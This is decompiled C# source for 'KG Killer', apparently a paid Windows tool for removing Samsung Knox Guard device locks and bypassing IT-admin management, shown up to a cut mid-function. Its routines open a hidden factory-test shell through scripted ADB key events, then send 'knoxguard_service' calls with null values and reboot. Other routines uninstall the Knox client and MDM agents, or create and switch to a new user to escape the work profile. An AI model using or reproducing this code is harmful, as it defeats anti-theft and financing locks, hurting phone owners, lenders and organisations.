﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Ports;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Newtonsoft.Json;
using Vurdalakov;

namespace KG_Killer
{
	// Token: 0x02000027 RID: 39
	public partial class KGKiller : Form
	{
		// Token: 0x060000C6 RID: 198 RVA: 0x00009370 File Offset: 0x00007570
		public KGKiller()
		{
			this.InitializeComponent();
			this.timer = new global::System.Windows.Forms.Timer();
			this.timer.Interval = 1000;
			this.timer.Tick += this.timer1_Tick;
			this.timer.Start();
			this.comboBox1.Text = "--------------------Select Model--------------------";
			this.Adb_Devices.Text = "-------------------Select Port-------------------";
		}

		// Token: 0x060000C7 RID: 199 RVA: 0x00009404 File Offset: 0x00007604
		private void LoadPorts()
		{
			this.Adb_Devices.DisplayMember = "DisplayName";
			List<KGKiller.ComPort> list = this.GetSerialPorts().FindAll((KGKiller.ComPort c) => c.Vid.Equals("04E8") && c.Pid.Equals("6860"));
			this.Adb_Devices.DataSource = list;
		}

		// Token: 0x060000C8 RID: 200 RVA: 0x00009458 File Offset: 0x00007658
		private List<KGKiller.ComPort> GetSerialPorts()
		{
			List<KGKiller.ComPort> list2;
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM WIN32_SerialPort"))
			{
				List<ManagementBaseObject> list = managementObjectSearcher.Get().Cast<ManagementBaseObject>().ToList<ManagementBaseObject>();
				list2 = list.Select(delegate(ManagementBaseObject p)
				{
					KGKiller.ComPort comPort = new KGKiller.ComPort
					{
						Name = p.GetPropertyValue("DeviceID").ToString(),
						Vid = p.GetPropertyValue("PNPDeviceID").ToString(),
						Description = p.GetPropertyValue("Caption").ToString()
					};
					Match match = Regex.Match(comPort.Vid, "VID_([0-9A-F]{4})", RegexOptions.IgnoreCase);
					Match match2 = Regex.Match(comPort.Vid, "PID_([0-9A-F]{4})", RegexOptions.IgnoreCase);
					if (match.Success)
					{
						comPort.Vid = match.Groups[1].Value;
					}
					if (match2.Success)
					{
						comPort.Pid = match2.Groups[1].Value;
					}
					return comPort;
				}).ToList<KGKiller.ComPort>();
			}
			return list2;
		}

		// Token: 0x060000C9 RID: 201 RVA: 0x000094CC File Offset: 0x000076CC
		private void elapsedTime()
		{
			Stopwatch stopwatch = new Stopwatch();
			stopwatch.Start();
			stopwatch.Stop();
			TimeSpan elapsed = stopwatch.Elapsed;
			this.ResultTxt.AppendText("\nElapsed Time  :");
			this.ResultTxt.SelectionColor = Color.Green;
			this.ResultTxt.AppendText(" { " + elapsed.ToString() + " } ");
		}

		// Token: 0x060000CA RID: 202 RVA: 0x0000953C File Offset: 0x0000773C
		private void ExecuteADBCommand(string command)
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/C " + command);
			processStartInfo.UseShellExecute = false;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.CreateNoWindow = true;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			process.Start();
			process.WaitForExit();
		}

		// Token: 0x060000CB RID: 203 RVA: 0x00009590 File Offset: 0x00007790
		private async Task WriteToSerialPortAsync(string data)
		{
			try
			{
				if (!this.serialPort.IsOpen)
				{
					this.ResultTxt.Text = "Serial port is closed. Cannot write data.";
					this.ResultTxt.ForeColor = Color.Red;
				}
				else
				{
					await this.serialPort.BaseStream.WriteAsync(Encoding.ASCII.GetBytes(data + "\r\n"), 0, (data + "\r\n").Length);
					TaskAwaiter taskAwaiter = this.serialPort.BaseStream.FlushAsync().GetAwaiter();
					if (!taskAwaiter.IsCompleted)
					{
						await taskAwaiter;
						TaskAwaiter taskAwaiter2;
						taskAwaiter = taskAwaiter2;
						taskAwaiter2 = default(TaskAwaiter);
					}
					taskAwaiter.GetResult();
				}
			}
			catch (Exception ex)
			{
				this.ResultTxt.Text = "Error writing to serial port: " + ex.Message;
				this.ResultTxt.ForeColor = Color.Red;
			}
		}

		// Token: 0x060000CC RID: 204 RVA: 0x000095DC File Offset: 0x000077DC
		private void ProcessResponse(string response)
		{
			string[] array = response.Split(new char[] { ';' });
			Dictionary<string, string> dictionary = new Dictionary<string, string>
			{
				{ "MN", "Model" },
				{ "BASE", "BaseBand" },
				{ "VER", "Version" },
				{ "CSC", "CSC" },
				{ "CC", "Country" },
				{ "SN", "SN" },
				{ "IMEI", "IMEI" },
				{ "UN", "Unique number" },
				{ "CON", "USB mode" },
				{ "LOCK", "Lock status" },
				{ "PN", "Phone number" },
				{ "MCN", "MCN" },
				{ "MNC", "MNC" }
			};
			foreach (string text in array)
			{
				string[] array3 = text.Split(new char[] { '(' });
				if (array3.Length == 2)
				{
					string text2 = array3[0].Trim();
					string text3 = array3[1].TrimEnd(new char[] { ')' });
					if (dictionary.ContainsKey(text2))
					{
						string text4 = dictionary[text2];
						this.ResultTxt.SelectionColor = Color.FloralWhite;
						this.ResultTxt.AppendText(text4 + " : ➾ ");
						this.ResultTxt.SelectionColor = Color.Green;
						this.ResultTxt.AppendText(text3 + "\n");
					}
				}
			}
		}

		// Token: 0x060000CD RID: 205 RVA: 0x00009790 File Offset: 0x00007990
		private void PopulateAdbDevicePorts()
		{
			try
			{
				string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
				string text = Path.Combine(baseDirectory, "data");
				string text2 = Path.Combine(text, "adb.exe");
				Process process = new Process();
				process.StartInfo.FileName = text2;
				process.StartInfo.Arguments = "devices";
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				string text3 = process.StandardOutput.ReadToEnd();
				process.WaitForExit();
				string[] array = text3.Split(new string[] { "\r\n", "\r", "\n" }, StringSplitOptions.RemoveEmptyEntries);
				this.Adb_Devices.Items.Clear();
				for (int i = 1; i < array.Length; i++)
				{
					string[] array2 = array[i].Split(new char[] { '\t' });
					if (array2.Length > 1)
					{
						this.Adb_Devices.Items.Add(array2[0]);
					}
				}
				if (this.Adb_Devices.Items.Count > 0)
				{
					this.Adb_Devices.SelectedIndex = 0;
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error: " + ex.Message);
			}
		}

		// Token: 0x060000CE RID: 206 RVA: 0x00009900 File Offset: 0x00007B00
		private void Logs(string msg, Color color)
		{
			try
			{
				base.Invoke(new MethodInvoker(delegate
				{
					this.ResultTxt.SelectionColor = color;
					this.ResultTxt.SelectionBullet = false;
					this.ResultTxt.AppendText(msg);
					this.ResultTxt.SelectionStart = this.ResultTxt.TextLength;
					this.ResultTxt.ScrollToCaret();
				}));
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error logging message: " + ex.Message);
			}
		}

		// Token: 0x060000CF RID: 207 RVA: 0x00009968 File Offset: 0x00007B68
		private async void MtpBtn_Click(object sender, EventArgs e)
		{
			await this.Method5Async();
		}

		// Token: 0x060000D0 RID: 208 RVA: 0x000099B0 File Offset: 0x00007BB0
		private void InstallApk1(string apkFileName)
		{
			try
			{
				string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
				string text = Path.Combine(baseDirectory, "data");
				string text2 = Path.Combine(text, "adb.exe");
				string text3 = Path.Combine(text, apkFileName);
				if (!File.Exists(text3))
				{
					MessageBox.Show("Data file not found.");
				}
				Process process = new Process();
				process.StartInfo.FileName = text2;
				process.StartInfo.Arguments = "install \"" + text3 + "\"";
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				string text4 = process.StandardOutput.ReadToEnd();
				process.WaitForExit();
				if (!text4.Contains("Success"))
				{
					MessageBox.Show("Data Allpy Error: " + text4);
				}
				else
				{
					this.ResultTxt.Text = "Data Update successfully.";
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error: " + ex.Message);
			}
		}

		// Token: 0x060000D1 RID: 209 RVA: 0x00009AD4 File Offset: 0x00007CD4
		private async Task Method5Async()
		{
			this.ResultTxt.Clear();
			if (MessageBox.Show("Is Your Device in MTP Mode ", "KG Killer", MessageBoxButtons.YesNo) == DialogResult.Yes)
			{
				KGKiller.ComPort comPort = this.Adb_Devices.SelectedItem as KGKiller.ComPort;
				if (comPort != null)
				{
					this.Logs("Read Info....\r\n", Color.Green);
					KGKiller._serialPort = new SerialPort
					{
						PortName = comPort.Name
					};
					try
					{
						KGKiller._serialPort.BaudRate = 115200;
						KGKiller._serialPort.Open();
						if (KGKiller._serialPort.IsOpen)
						{
							string atCommand = "AT+DEVCONINFO";
							KGKiller._serialPort.Write(atCommand + "\r\n");
							Thread.Sleep(1000);
							string response = KGKiller._serialPort.ReadTo("#OK#");
							this.ProcessResponse(response);
							atCommand = null;
							response = null;
						}
						else
						{
							this.Logs("Failed to open port, check the port and try again \r\n", Color.Red);
						}
					}
					catch
					{
					}
					finally
					{
						if (KGKiller._serialPort.IsOpen)
						{
							KGKiller._serialPort.Close();
						}
					}
				}
				comPort = null;
			}
			else
			{
				this.Logs("First Connect Your Device\r\n", Color.Red);
			}
		}

		// Token: 0x060000D2 RID: 210 RVA: 0x00009B18 File Offset: 0x00007D18
		private void LiveScrnBtn_Click(object sender, EventArgs e)
		{
			try
			{
				string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
				string text = Path.Combine(baseDirectory, "data");
				Directory.SetCurrentDirectory(text);
				string text2 = "scp.vbs";
				string text3 = Path.Combine(text, text2);
				if (File.Exists(text3))
				{
					Process.Start(text3);
				}
				else
				{
					Console.WriteLine("Script file not found.");
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine("Error: " + ex.Message);
			}
		}

		// Token: 0x060000D3 RID: 211 RVA: 0x00009B9C File Offset: 0x00007D9C
		private void DvcMngr_Click(object sender, EventArgs e)
		{
			Process.Start("devmgmt.msc");
		}

		// Token: 0x060000D4 RID: 212 RVA: 0x00009BB4 File Offset: 0x00007DB4
		private async void KgBtn_Click(object sender, EventArgs e)
		{
			this.ResultTxt.Clear();
			MessageBox.Show("If You Fail Then Try Again Same Process", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			string usernamee = Form3.usrname;
			this.Logs("\nUser :", Color.FloralWhite);
			this.Logs(usernamee, Color.OrangeRed);
			this.Logs("\nOperation:", Color.FloralWhite);
			this.Logs("KG Android 13 (07-23)\n", Color.Gold);
			try
			{
				this.Logs("\nChecking ADB Server..", Color.FloralWhite);
				await Task.Delay(100);
				if (this.CheckRunAdb())
				{
					this.Logs(" Running\n", Color.Green);
					TaskAwaiter taskAwaiter = Task.Delay(10).GetAwaiter();
					TaskAwaiter taskAwaiter2;
					if (!taskAwaiter.IsCompleted)
					{
						await taskAwaiter;
						taskAwaiter = taskAwaiter2;
						taskAwaiter2 = default(TaskAwaiter);
					}
					taskAwaiter.GetResult();
					this.Logs("Searching devices..\n", Color.FloralWhite);
					await Task.Delay(10);
					this.progressBar1.Value = 0;
					if (this.CariAdbDevice())
					{
						TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
						if (!taskAwaiter3.IsCompleted)
						{
							await taskAwaiter3;
							taskAwaiter3 = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter3.GetResult();
						this.adbclients.SetDevice(this.SnAdb);
						Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
						try
						{
							this.Logs("Model  : ", Color.FloralWhite);
							this.Logs(props["ro.product.model"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Brand  : ", Color.FloralWhite);
							this.Logs(props["ro.product.brand"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("CPU  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.product.board"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Version  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.incremental"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Build date  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.date"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Security patch  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.security_patch"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Android version  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.release"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Android SDK  ➾ ", Color.FloralWhite);
							this.Logs(props["ro.build.version.sdk"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("KG STATUS➾ ", Color.FloralWhite);
							this.Logs(props["knox.kg.state"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.progressBar1.Value = 10;
						}
						catch (Exception ex)
						{
							Console.WriteLine("Error➾ " + ex.Message);
						}
						this.Logs("Writing Data File ", Color.FloralWhite);
						this.Logs(" OK\n", Color.Green);
						await Task.Delay(100);
						await Task.WhenAll(new Task[]
						{
							Task.Run(delegate
							{
								this.InstallApk("a.apk", "install -i PrePackageInstaller");
							}),
							Task.Delay(100),
							Task.Run(delegate
							{
								this.InstallApk("b.apk", "install -i PrePackageInstaller");
							}),
							Task.Delay(100)
						});
						this.progressBar1.Value = 20;
						await this.PushApkAsync("1.apk", "/data/local/tmp/zero.apk");
						await Task.Delay(1000);
						this.Logs("Writing Data File To System ", Color.Red);
						this.progressBar1.Value = 30;
						string[] adbCommands = new string[]
						{
							"am start -n com.sec.android.app.audiocoredebug/com.sec.android.app.audiocoredebug.MainActivity", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent KEYCODE_TAB", "input keyevent 66", "input text 'am start -n com.samsung.android.FactoryTestLauncher/com.samsung.android.FactoryTestLauncher.addons.Shell.ShellActivity'",
							"input keyevent KEYCODE_TAB", "input keyevent 66"
						};
						this.Logs(" OK\n", Color.Green);
						this.progressBar1.Value = 50;
						this.Logs("Erase KG ", Color.FloralWhite);
						foreach (string command in adbCommands)
						{
							this.adbclients.ExecuteRemoteCommand(command);
							Thread.Sleep(200);
							command = null;
						}
						string[] array = null;
						Task.Delay(100);
						List<string> list3 = new List<string>
						{
							"input text 'service call knoxguard_service 37'", "input keyevent 66", "input text 'service call knoxguard_service 44 s16 'null''", "input keyevent 66", "input text 'service call knoxguard_service 43 s16 'null''", "input keyevent 66", "input text 'service call knoxguard_service 42 s16 'null''", "input keyevent 66", "input text 'service call knoxguard_service 41 s16 'null''", "input keyevent 66",
							"input text 'service call knoxguard_service 41 s16 null'", "input keyevent 66", "input text 'service call knoxguard_service 40 s16 'null''", "input keyevent 66", "input text 'service call knoxguard_service 40 s16 null'", "input keyevent 66", "input text 'service call knoxguard_service 40'", "input keyevent 66", "input text 'reboot'", "input keyevent 66"
						};
						Process process3 = ShellController.CreateShellProcess();
						foreach (string command2 in list3)
						{
							string output = ShellController.ExecuteShellCommand(process3, command2, 20000);
							output = this.CustomizeOutput(output);
							output = null;
							command2 = null;
						}
						List<string>.Enumerator enumerator = default(List<string>.Enumerator);
						ShellController.CloseShellProcess(process3);
						this.Logs(" Ok\n", Color.Green);
						this.progressBar1.Value = 90;
						string text = await this.<KgBtn_Click>g__GetWaitForDevicesResultAsync|32_2();
						string result = text + "\n";
						text = null;
						this.Logs(" KG STATUS  ➾ ", Color.FloralWhite);
						this.Logs(props["knox.kg.state"] + " \n", Color.Green);
						this.Logs("KG Removed Sucessfully By KG Killer\n\r", Color.Gold);
						this.progressBar1.Value = 100;
						this.progressBar1.Value = 0;
						props = null;
						adbCommands = null;
						list3 = null;
						process3 = null;
					}
					else
					{
						this.Logs(" Device not found", Color.Red);
					}
				}
				else
				{
					await this.WaitForDevices();
				}
			}
			catch (Exception ex2)
			{
				Console.WriteLine("Error➾ " + ex2.Message);
			}
		}

		// Token: 0x060000D5 RID: 213 RVA: 0x00009BFC File Offset: 0x00007DFC
		private async void ItAdminBtn_Click(object sender, EventArgs e)
		{
			await this.ItAdminMethod1();
		}

		// Token: 0x060000D6 RID: 214 RVA: 0x00009C44 File Offset: 0x00007E44
		private async Task ItAdminMethod1()
		{
			string usernamee = Form3.usrname;
			this.Logs("\nUser :", Color.FloralWhite);
			this.Logs(usernamee, Color.OrangeRed);
			this.Logs("\nOperation:", Color.FloralWhite);
			this.Logs("IT Admin (Work profile)\n", Color.Gold);
			this.ResultTxt.Clear();
			await this.AppendTextAsync("Reading Device Info", Color.FloralWhite, 1000, false);
			await Task.Delay(1);
			await this.AppendTextAsync(" OK\n", Color.Green, 10, true);
			string adbKill = "kill-server";
			await Adb.AdbCommandAsync(adbKill);
			await Task.Delay(3000);
			string adbStart = "start-server";
			await Adb.AdbCommandAsync(adbStart);
			await Adb.AdbCommandAsync("shell pm disable-user --user 0 com.google.android.gsf");
			await Task.Delay(1);
			string readModelCommand = "shell getprop ro.product.model";
			string text = await Adb.AdbCommandAsync(readModelCommand);
			string model = text;
			text = null;
			await this.AppendTextAsync("Model➾ ", Color.FloralWhite, 1000, true);
			await this.AppendTextAsync(model, Color.Green, 1000, true);
			string readVersionCommand = "shell getprop ro.build.version.release";
			string text2 = await Adb.AdbCommandAsync(readVersionCommand);
			string androidVersion = text2;
			text2 = null;
			await this.AppendTextAsync("Android Version➾ ", Color.FloralWhite, 1000, true);
			await this.AppendTextAsync(androidVersion, Color.Green, 1000, true);
			await this.AppendTextAsync("Reading Device Security", Color.FloralWhite, 1000, false);
			await this.AppendTextAsync(" OK\n", Color.Green, 10, true);
			await this.AppendTextAsync("Writing Device Security", Color.FloralWhite, 1000, false);
			await this.AppendTextAsync(" OK\n", Color.Green, 10, true);
			string createUserCommand = "shell pm create-user \"KG Killer\"\r\n";
			await Adb.AdbCommandAsync(createUserCommand);
			string getUserIdCommand = "shell pm list users";
			string text3 = await Adb.AdbCommandAsync(getUserIdCommand);
			string output = text3;
			text3 = null;
			Console.WriteLine("Output from pm list users➾ " + output);
			string userId = this.ExtractUserId(output);
			if (!string.IsNullOrEmpty(userId))
			{
				Console.WriteLine("User ID: " + userId);
				string switchUserCommand = "shell am switch-user " + userId;
				TaskAwaiter<string> taskAwaiter = Adb.AdbCommandAsync(switchUserCommand).GetAwaiter();
				if (!taskAwaiter.IsCompleted)
				{
					await taskAwaiter;
					TaskAwaiter<string> taskAwaiter2;
					taskAwaiter = taskAwaiter2;
					taskAwaiter2 = default(TaskAwaiter<string>);
				}
				taskAwaiter.GetResult();
				DialogResult result = MessageBox.Show("After Complete Set-Up Your Device Click Yes ?", "KG Killer IT Admin Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Question);
				if (result == DialogResult.Yes)
				{
					string removeUserRestrictionCommand = "shell pm set-user-restriction --user " + userId + " no_add_user false";
					await Adb.AdbCommandAsync(removeUserRestrictionCommand);
					string setOwnerCommand = "shell pm set-user-restriction --user " + userId + " no_user_switch true";
					await Adb.AdbCommandAsync(setOwnerCommand);
					await this.AppendTextAsync("Process Complete By KG Killer", Color.Green, 1000, false);
					removeUserRestrictionCommand = null;
					setOwnerCommand = null;
				}
				switchUserCommand = null;
			}
			else
			{
				TaskAwaiter taskAwaiter3 = this.AppendTextAsync("Error getting user ID", Color.Red, 1000, true).GetAwaiter();
				if (!taskAwaiter3.IsCompleted)
				{
					await taskAwaiter3;
					TaskAwaiter taskAwaiter4;
					taskAwaiter3 = taskAwaiter4;
					taskAwaiter4 = default(TaskAwaiter);
				}
				taskAwaiter3.GetResult();
			}
		}

		// Token: 0x060000D7 RID: 215 RVA: 0x00009C88 File Offset: 0x00007E88
		private async Task AppendTextAsync(string text, Color color, int delay, bool newLine)
		{
			await Task.Delay(delay);
			this.Logs(text + (newLine ? "\n" : ""), color);
		}

		// Token: 0x060000D8 RID: 216 RVA: 0x00009CEC File Offset: 0x00007EEC
		private string ExtractUserId(string output)
		{
			string[] array = output.Split(new char[] { '\n' }, StringSplitOptions.RemoveEmptyEntries);
			foreach (string text in array)
			{
				if (text.Contains("User ID:"))
				{
					return text.Substring(text.IndexOf("User ID:") + "User ID:".Length).Trim();
				}
			}
			return string.Empty;
		}

		// Token: 0x060000D9 RID: 217 RVA: 0x00009D60 File Offset: 0x00007F60
		private async void Adb_Devices_DropDown(object sender, EventArgs e)
		{
			this.LoadPorts();
		}

		// Token: 0x060000DA RID: 218 RVA: 0x00009DA8 File Offset: 0x00007FA8
		private async void KGKiller_Load(object sender, EventArgs e)
		{
			this.LoadPorts();
			this.lblDate.Text = DateTime.Now.ToString("d/MM/yyyy") + "  " + DateTime.Now.ToString("HH:mm:ss");
			string usernamee = Form3.usrname;
			this.label3.Text = usernamee;
			this.label5.Text = Environment.MachineName;
			string hwid = this.GenerateHWID();
			string ip = this.GenerateIP();
			string text = await this.SendDataToPHP(hwid, usernamee, ip);
			string result = text;
			text = null;
			Console.WriteLine(result);
			TaskAwaiter<KGKiller.ApiResponse> taskAwaiter = this.GetExpiryAndCreditsAsync(usernamee).GetAwaiter();
			if (!taskAwaiter.IsCompleted)
			{
				await taskAwaiter;
				TaskAwaiter<KGKiller.ApiResponse> taskAwaiter2;
				taskAwaiter = taskAwaiter2;
				taskAwaiter2 = default(TaskAwaiter<KGKiller.ApiResponse>);
			}
			KGKiller.ApiResponse apiResponse = taskAwaiter.GetResult();
			KGKiller.ApiResponse response = apiResponse;
			apiResponse = null;
			if (response != null)
			{
				if (!string.IsNullOrEmpty(response.ExpiryDate))
				{
					this.lblExpiryDate.Text = response.ExpiryDate;
				}
				else
				{
					this.lblExpiryDate.Text = "Expiry Date not found.";
				}
				this.lblCredits.Text = ((response.Credits > 0) ? string.Format("{0} Credits", response.Credits) : "No credits");
			}
			else
			{
				this.lblExpiryDate.Text = "Error retrieving data.";
				this.lblCredits.Text = "Error retrieving credits.";
			}
		}

		// Token: 0x060000DB RID: 219 RVA: 0x00009DF0 File Offset: 0x00007FF0
		private async Task<KGKiller.ApiResponse> GetExpiryAndCreditsAsync(string username)
		{
			KGKiller.ApiResponse response = null;
			try
			{
				string url = "https://kgkiller.com/server/loginhandles/a.php?username=" + username;
				using (HttpClient client = new HttpClient())
				{
					HttpResponseMessage httpResponseMessage = await client.GetAsync(url);
					HttpResponseMessage httpResponse = httpResponseMessage;
					httpResponseMessage = null;
					if (httpResponse.IsSuccessStatusCode)
					{
						TaskAwaiter<string> taskAwaiter = httpResponse.Content.ReadAsStringAsync().GetAwaiter();
						if (!taskAwaiter.IsCompleted)
						{
							await taskAwaiter;
							TaskAwaiter<string> taskAwaiter2;
							taskAwaiter = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter<string>);
						}
						string text = taskAwaiter.GetResult();
						string json = text;
						text = null;
						response = JsonConvert.DeserializeObject<KGKiller.ApiResponse>(json);
						json = null;
					}
					httpResponse = null;
				}
				HttpClient client = null;
				url = null;
			}
			catch (Exception ex)
			{
				MessageBox.Show("Error: " + ex.Message);
			}
			return response;
		}

		// Token: 0x060000DC RID: 220 RVA: 0x00009E3C File Offset: 0x0000803C
		private async Task<string> SendDataToPHP(string hwid, string usernamee, string ip)
		{
			string text2;
			using (HttpClient client = new HttpClient())
			{
				Dictionary<string, string> values = new Dictionary<string, string>
				{
					{ "hwid", hwid },
					{ "ip", ip },
					{ "username", usernamee }
				};
				FormUrlEncodedContent content = new FormUrlEncodedContent(values);
				try
				{
					TaskAwaiter<HttpResponseMessage> taskAwaiter = client.PostAsync("https://kgkiller.com/server/loginhandles/iuewarf.php", content).GetAwaiter();
					if (!taskAwaiter.IsCompleted)
					{
						await taskAwaiter;
						TaskAwaiter<HttpResponseMessage> taskAwaiter2;
						taskAwaiter = taskAwaiter2;
						taskAwaiter2 = default(TaskAwaiter<HttpResponseMessage>);
					}
					HttpResponseMessage httpResponseMessage = taskAwaiter.GetResult();
					HttpResponseMessage response = httpResponseMessage;
					httpResponseMessage = null;
					TaskAwaiter<string> taskAwaiter3 = response.Content.ReadAsStringAsync().GetAwaiter();
					if (!taskAwaiter3.IsCompleted)
					{
						await taskAwaiter3;
						TaskAwaiter<string> taskAwaiter4;
						taskAwaiter3 = taskAwaiter4;
						taskAwaiter4 = default(TaskAwaiter<string>);
					}
					string text = taskAwaiter3.GetResult();
					string responseString = text;
					text = null;
					text2 = responseString;
				}
				catch (Exception ex)
				{
					text2 = "Error: " + ex.Message;
				}
			}
			return text2;
		}

		// Token: 0x060000DD RID: 221 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void ResultTxt_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060000DE RID: 222 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void panel1_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x060000DF RID: 223 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void Adb_Devices_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x060000E0 RID: 224 RVA: 0x00007DB4 File Offset: 0x00005FB4
		private void label1_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x060000E1 RID: 225 RVA: 0x00009E98 File Offset: 0x00008098
		private async void button2_Click(object sender, EventArgs e)
		{
			this.ResultTxt.Clear();
			MessageBox.Show("If You Fail Then Try Again Same Process", "KG Killer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			string usernamee = Form3.usrname;
			this.Logs("\nUser :", Color.FloralWhite);
			this.Logs(usernamee, Color.OrangeRed);
			this.Logs("\nOperation:", Color.FloralWhite);
			this.Logs("KG Android 14(All Patch)\n", Color.Gold);
			try
			{
				this.Logs("\nChecking ADB Server..", Color.FloralWhite);
				await Task.Delay(100);
				if (!this.CheckRunAdb())
				{
					TaskAwaiter taskAwaiter = this.WaitForDevices().GetAwaiter();
					if (!taskAwaiter.IsCompleted)
					{
						await taskAwaiter;
						TaskAwaiter taskAwaiter2;
						taskAwaiter = taskAwaiter2;
						taskAwaiter2 = default(TaskAwaiter);
					}
					taskAwaiter.GetResult();
				}
				else
				{
					this.Logs(" Running\n", Color.Green);
					TaskAwaiter taskAwaiter3 = Task.Delay(10).GetAwaiter();
					TaskAwaiter taskAwaiter2;
					if (!taskAwaiter3.IsCompleted)
					{
						await taskAwaiter3;
						taskAwaiter3 = taskAwaiter2;
						taskAwaiter2 = default(TaskAwaiter);
					}
					taskAwaiter3.GetResult();
					this.Logs("Searching devices..\n", Color.FloralWhite);
					await Task.Delay(10);
					this.progressBar1.Value = 10;
					if (this.CariAdbDevice())
					{
						TaskAwaiter taskAwaiter4 = Task.Delay(10).GetAwaiter();
						if (!taskAwaiter4.IsCompleted)
						{
							await taskAwaiter4;
							taskAwaiter4 = taskAwaiter2;
							taskAwaiter2 = default(TaskAwaiter);
						}
						taskAwaiter4.GetResult();
						this.adbclients.SetDevice(this.SnAdb);
						Dictionary<string, string> props = this.adbclients.GetDeviceProperties();
						try
						{
							this.Logs("Model  : ", Color.FloralWhite);
							this.Logs(props["ro.product.model"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Brand  : ", Color.FloralWhite);
							this.Logs(props["ro.product.brand"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("CPU  : ", Color.FloralWhite);
							this.Logs(props["ro.product.board"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Version  : ", Color.FloralWhite);
							this.Logs(props["ro.build.version.incremental"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Build date  : ", Color.FloralWhite);
							this.Logs(props["ro.build.date"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Security patch  : ", Color.FloralWhite);
							this.Logs(props["ro.build.version.security_patch"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Android version  : ", Color.FloralWhite);
							this.Logs(props["ro.build.version.release"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("Android SDK  : ", Color.FloralWhite);
							this.Logs(props["ro.build.version.sdk"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.Logs("KG STATUS: ", Color.FloralWhite);
							this.Logs(props["knox.kg.state"], Color.Green);
							this.Logs("\n", Color.FloralWhite);
							this.progressBar1.Value = 20;
						}
						catch (Exception ex)
						{
							Console.WriteLine("Error: " + ex.Message);
						}
						this.Logs("Writing Data File :", Color.FloralWhite);
						await Task.Delay(1000);
						this.progressBar1.Value = 30;
						string[] adbCommands = new string[]
						{
							"pm uninstall-system-updates com.samsung.android.kgclient", "pm disable-user --user 0 com.samsung.android.kgclient", "pm uninstall --user 0 com.android.systemui", "pm uninstall --user 0 com.samsung.klmsagent", "pm uninstall --user 0 com.android.ons", "pm uninstall --user 0 com.android.dynsystem", "pm uninstall --user 0 com.samsung.android.app.updatecenter", "pm uninstall --user 0 com.google.android.configupdater", "pm uninstall --user 0 com.wssyncmldm", "pm uninstall --user 0 com.sec.enterprise.knox.cloudmdm.smdms",
							"am set-inactive com.samsung.android.kgclient true", "am kill com.samsung.android.kgclient", "am crash com.samsung.android.kgclient", "am stop-app com.samsung.android.kgclient", "pm uninstall-system-updates com.samsung.android.kgclient", "pm disable-user --user 0 com.samsung.android.kgclient", "pm enable --user 0 com.samsung.android.kgclient", "pm uninstall-system-updates com.samsung.android.kgclient", "pm suspend com.samsung.android.kgclient", "pm uninstall --user 0 com.samsung.android.kgclient",
							"pm install-existing --restrict-permissions --user 0 com.samsung.android.kgclient"
						};
						this.Logs(" OK\n", Color.Green);
						this.progressBar1.Value = 50;
